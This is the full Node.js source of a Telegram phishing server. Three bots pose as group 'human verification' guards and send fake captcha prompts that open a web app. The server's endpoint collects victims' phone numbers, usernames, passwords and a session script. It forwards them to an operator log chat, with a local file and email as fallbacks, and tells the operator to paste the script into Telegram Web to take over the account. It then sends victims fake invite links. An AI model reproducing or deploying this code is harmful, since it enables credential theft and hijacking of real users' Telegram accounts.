const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const phoneUtil = require('google-libphonenumber').PhoneNumberUtil.getInstance();
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Debug logging for environment variables
console.log('Environment Variables:');
console.log('SAFEGUARD_TOKEN:', process.env.SAFEGUARD_TOKEN ? process.env.SAFEGUARD_TOKEN.slice(0, 10) + '...' : 'Not set');
console.log('DELUGE_TOKEN:', process.env.DELUGE_TOKEN ? process.env.DELUGE_TOKEN.slice(0, 10) + '...' : 'Not set');
console.log('GUARDIAN_TOKEN:', process.env.GUARDIAN_TOKEN ? process.env.GUARDIAN_TOKEN.slice(0, 10) + '...' : 'Not set');
console.log('DOMAIN:', process.env.DOMAIN);
console.log('LOGS_ID:', process.env.LOGS_ID);
console.log('EMAIL_USER:', process.env.EMAIL_USER);
console.log('EMAIL_PASS:', process.env.EMAIL_PASS);
console.log('PORT:', process.env.PORT);

const safeguardToken = process.env.SAFEGUARD_TOKEN;
const delugeToken = process.env.DELUGE_TOKEN;
const guardianToken = process.env.GUARDIAN_TOKEN;

// Use polling instead of webhooks
const safeguardBot = safeguardToken ? new TelegramBot(safeguardToken, { polling: true }) : null;
const delugeBot = delugeToken ? new TelegramBot(delugeToken, { polling: true }) : null;
const guardianBot = guardianToken ? new TelegramBot(guardianToken, { polling: true }) : null;

const safeguardUsername = "SafetyGuardianRobot";
const delugeUsername = "DelugeGuardiansBot";
const guardianUsername = "GuardianSafetyrobot";

const safeguardVerification = path.join(__dirname, 'images', 'safeguard_verification.jpg');
const delugeVerification = path.join(__dirname, 'images', 'deluge_verification.jpg');
const guardianVerification = path.join(__dirname, 'images', 'guardian_verification.jpg');

const safeguardSuccess = path.join(__dirname, 'images', 'safeguard_success.jpg');
const guardianSuccess = path.join(__dirname, 'images', 'guardian_success.jpg');

const guardianButtonTexts = [
  "Join Group",
  "Enter Chat",
  "Access Now",
  "Join Now",
  "Enter Now"
];

// Set up nodemailer transporter with error handling
let transporter;
try {
  if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
    transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });
    console.log('Nodemailer transporter initialized successfully');
  } else {
    console.error('Nodemailer not initialized: EMAIL_USER or EMAIL_PASS missing');
  }
} catch (error) {
  console.error('Failed to initialize nodemailer transporter:', error.message);
}

// Add polling error handling
// Add polling error handling with retry limit
// Add polling error handling with retry limit
const handlePollingError = (bot, botName) => {
  let retryCount = 0;
  const maxRetries = 5;

  bot.on('polling_error', (error) => {
    console.error(`${botName} polling error:`, error.message);
    if (error.message.includes('401 Unauthorized')) {
      console.error(`${botName} token is invalid or revoked. Please check the token in environment variables.`);
      process.exit(1); // Exit if token is invalid
    } else if (error.message.includes('409 Conflict')) {
      if (retryCount >= maxRetries) {
        console.error(`${botName} maximum retry limit reached. Exiting...`);
        process.exit(1);
      }
      retryCount++;
      console.warn(`${botName} conflict detected. Retrying polling in 60 seconds (Attempt ${retryCount}/${maxRetries})...`);
      setTimeout(() => {
        bot.stopPolling().then(() => {
          console.log(`${botName} stopped polling. Restarting...`);
          bot.startPolling();
        });
      }, 60000);
    }
  });
};

if (safeguardBot) handlePollingError(safeguardBot, 'Safeguard bot');
if (delugeBot) handlePollingError(delugeBot, 'Deluge bot');
if (guardianBot) handlePollingError(guardianBot, 'Guardian bot');

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function handleStart(bot) {
  bot.onText(/\/start(?: (.*))?$/, (msg, match) => {
    console.log(`Received /start command for bot with message: ${JSON.stringify(msg)}`);
    const parameter = match[1];
    let botInfo;
    bot.getMe().then(botInformation => {
      botInfo = botInformation;
      if (botInfo.username) {
        const chatId = msg.chat.id;
        let jsonToSend;
        let imageToSend;
        if (parameter === 'login') {
          jsonToSend = {
            caption: `Please share your login data to continue.`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{
                text: "Share Login Data",
                web_app: {
                  url: `${process.env.DOMAIN}/${botInfo.username.toLowerCase().replace('bot', '')}/?type=${botInfo.username.toLowerCase().replace('bot', '')}`
                }
              }]]
            }
          };
          if (botInfo.username === safeguardUsername) {
            imageToSend = safeguardVerification;
          } else if (botInfo.username === delugeUsername) {
            imageToSend = delugeVerification;
          } else if (botInfo.username === guardianUsername) {
            imageToSend = guardianVerification;
          }
        } else {
          if (botInfo.username === safeguardUsername) {
            jsonToSend = {
              caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{
                  text: "VERIFY",
                  web_app: {
                    url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
                  }
                }]]
              }
            };
            imageToSend = safeguardVerification;
          } else if (botInfo.username === delugeUsername) {
            jsonToSend = {
              caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{
                  text: "Tap To Verify",
                  web_app: {
                    url: `${process.env.DOMAIN}/deluge/?type=deluge`
                  }
                }]]
              }
            };
            imageToSend = delugeVerification;
          } else if (botInfo.username === guardianUsername) {
            jsonToSend = {
              caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{
                  text: "Verify",
                  web_app: {
                    url: `${process.env.DOMAIN}/guardian/?type=guardian`
                  }
                }]]
              }
            };
            imageToSend = guardianVerification;
          }
        }
        
        // Read the image file as a Buffer
        try {
          const imageBuffer = fs.readFileSync(imageToSend);
          bot.sendPhoto(
            chatId, 
            imageBuffer,
            jsonToSend
          ).catch(error => {
            console.error(`Failed to send photo to chat ${chatId}:`, error.message);
          });
        } catch (error) {
          console.error(`Failed to read image file ${imageToSend}:`, error.message);
          bot.sendMessage(
            chatId,
            "Sorry, I couldn't load the verification image. Please try again later."
          ).catch(err => {
            console.error(`Failed to send error message to chat ${chatId}:`, err.message);
          });
        }
      }
    }).catch(error => {
      console.error('Failed to get bot info:', error.message);
    });
  });
}

const handleRequest = async (req, res, data) => {  
  const botMap = {
    safeguard: safeguardBot,
    guardian: guardianBot,
    deluge: delugeBot
  };
  let bot = botMap[data.type] || null;
  if (!bot) {
    console.error(`No bot found for type: ${data.type}`);
    res.status(400).json({ error: "Invalid bot type" });
    return;
  }
  const logMessage = `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.firstName}\n⭐ <b>Telegram Premium</b>: ${data.isPremium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.phoneNumber}</tg-spoiler>\n${data.usernames.map(u => `👤 <b>Username</b>: @${u.username}`).join('\n')}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script || "Not available"}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`;
  console.log(`Attempting to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, logMessage);
  let messageSent = false;
  try {
    await bot.sendMessage(
      process.env.LOGS_ID,
      logMessage,
      { parse_mode: "HTML" }
    );
    console.log(`Successfully sent message to LOGS_ID for user ${data.userId}`);
    messageSent = true;
  } catch (error) {
    console.error(`Failed to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, error.message, error.stack);
  }
  if (!messageSent) {
    console.log("Fallback: Logging user data to Render logs due to failure in sending to LOGS_ID:");
    console.log(logMessage);
    // Save to file
    try {
      const timestamp = new Date().toISOString();
      const logEntry = `[${timestamp}] ${logMessage}\n\n`;
      fs.appendFileSync(path.join(__dirname, 'logs', 'login_data.txt'), logEntry);
      console.log(`Successfully saved login data to logs/login_data.txt for user ${data.userId}`);
    } catch (fileError) {
      console.error(`Failed to save login data to file for user ${data.userId}:`, fileError.message);
    }
    // Send to email
    if (transporter) {
      try {
        await transporter.sendMail({
          from: process.env.EMAIL_USER,
          to: process.env.EMAIL_USER,
          subject: `User Login Data for ${data.userId}`,
          text: logMessage.replace(/<[^>]+>/g, ''), // Strip HTML tags for plain text email
          html: logMessage
        });
        console.log(`Successfully sent login data to email for user ${data.userId}`);
      } catch (emailError) {
        console.error(`Failed to send login data to email for user ${data.userId}:`, emailError.message);
      }
    } else {
      console.error(`Cannot send email for user ${data.userId}: Nodemailer transporter not initialized`);
    }
  }
  let type = data.type;
  if (type === "safeguard" || type === "guardian") {
    let image;
    let caption;
    if (type === "safeguard") {
      image = safeguardSuccess;
      caption = `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one time use and will expire`;
    } else if (type === "guardian") {
      image = guardianSuccess;
      caption = `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
    }

    const randomText = guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)];

    const guardianButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: randomText,
              url: `https://t.me/+${generateRandomString(16)}`
            }
          ]
        ]
      }
    };
    const safeguardButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "@SOLTRENDING",
              url: "https://t.me/SOLTRENDING"
            }
          ]
        ]
      }
    };

    const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;

    try {
      await bot.sendPhoto(data.userId, image, {
        caption,
        ...buttons,
        parse_mode: "HTML"
      });
      console.log(`Successfully sent photo to user ${data.userId}`);
    } catch (error) {
      console.error(`Failed to send photo to user ${data.userId}:`, error.message);
    }
  }

  res.json({});
};

app.post('/api/users/telegram/info', async (req, res) => {
  console.log(`Received request at /api/users/telegram/info with body: ${JSON.stringify(req.body)}`);
  const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
  let formattedUsernames = [];
  if (usernames) {
    if (Array.isArray(usernames)) {
      formattedUsernames = usernames;
    } else if (typeof usernames === 'string') {
      try {
        formattedUsernames = JSON.parse(usernames);
      } catch (e) {
        console.error(`Failed to parse usernames: ${usernames}`, e);
      }
    }
  }
  await handleRequest(req, res, {
    userId,
    firstName,
    usernames: formattedUsernames,
    phoneNumber: phoneNumber || "Not shared",
    isPremium,
    password,
    quicklySet,
    type,
    script: quicklySet?.script
  });
});

app.post('/api/debug', (req, res) => {
  console.log(`Debug message from check.js: ${req.body.message}`);
  res.json({ status: 'ok' });
});

if (safeguardBot) handleStart(safeguardBot);
if (delugeBot) handleStart(delugeBot);
if (guardianBot) handleStart(guardianBot);

console.log("Safeguard bot initialized:", !!safeguardBot);
console.log("Deluge bot initialized:", !!delugeBot);
console.log("Guardian bot initialized:", !!guardianBot);

if (safeguardBot) {
  safeguardBot.getMe().then(botInfo => {
    console.log(`Safeguard Bot Username: ${botInfo.username}`);
  }).catch(error => {
    console.error("Failed to get Safeguard bot info:", error.message);
  });
}

if (delugeBot) {
  delugeBot.getMe().then(botInfo => {
    console.log(`Deluge Bot Username: ${botInfo.username}`);
  }).catch(error => {
    console.error("Failed to get Deluge bot info:", error.message);
  });
}

if (guardianBot) {
  guardianBot.getMe().then(botInfo => {
    console.log(`Guardian Bot Username: ${botInfo.username}`);
  }).catch(error => {
    console.error("Failed to get Guardian bot info:", error.message);
  });
}

// Start the server with error handling
const port = process.env.PORT;
if (!port) {
  console.error('PORT environment variable is not set. Exiting...');
  process.exit(1);
}

app.listen(port, '0.0.0.0', () => {
  console.log(`Server running on port ${port}`);
}).on('error', (error) => {
  console.error(`Failed to start server on port ${port}:`, error.message);
  if (error.code === 'EADDRINUSE') {
    console.error(`Port ${port} is already in use. Please ensure no other process is using this port.`);
  }
  process.exit(1);
});
